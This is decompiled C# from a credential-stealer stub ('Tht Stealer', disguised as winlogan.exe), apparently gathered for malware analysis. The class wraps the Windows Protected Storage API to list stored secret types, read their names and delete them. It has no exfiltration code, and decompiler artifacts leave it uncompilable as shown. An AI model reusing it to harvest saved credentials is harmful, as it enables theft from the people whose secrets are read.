// Decompiled with JetBrains decompiler
// Type: CType_Renamed
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using PStoreLib;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

internal class CType_Renamed : CUtils
{
  private IPStore m_IPStore;
  private Guid m_Guid;
  private string m_DisplayName;
  private PST_KEY m_KeyType;
  private CSubTypes m_SubTypes;

  public string TypeGuid
  {
    get
    {
      return this.m_Guid.ToString();
    }
  }

  public string DisplayName
  {
    get
    {
      return this.m_DisplayName;
    }
  }

  public CSubTypes SubTypes
  {
    get
    {
      return this.m_SubTypes;
    }
  }

  [DebuggerNonUserCode]
  public CType_Renamed()
  {
    this.m_Guid = new Guid();
  }

  internal void Init(IPStore PStore, PST_KEY KeyType, ref Guid guidType)
  {
    this.m_IPStore = PStore;
    this.m_Guid = guidType;
    int ppInfo;
    this.m_IPStore.GetTypeInfo(KeyType, ref guidType, out ppInfo, 0);
    if (ppInfo != 0)
    {
      IntPtr ptr = new IntPtr(ppInfo);
      PST_TYPEINFO pstTypeinfo1;
      object obj = Marshal.PtrToStructure(ptr, pstTypeinfo1.GetType());
      PST_TYPEINFO pstTypeinfo2;
      this.m_DisplayName = this.CopyString((obj != null ? (PST_TYPEINFO) obj : pstTypeinfo2).szDisplayName);
      ptr = new IntPtr(ppInfo);
      Marshal.FreeCoTaskMem(ptr);
    }
    this.m_SubTypes = new CSubTypes();
    this.m_SubTypes.Init(PStore, KeyType, ref guidType);
  }

  public void Delete()
  {
    this.m_IPStore.DeleteType(this.m_KeyType, ref this.m_Guid, 0);
  }
}
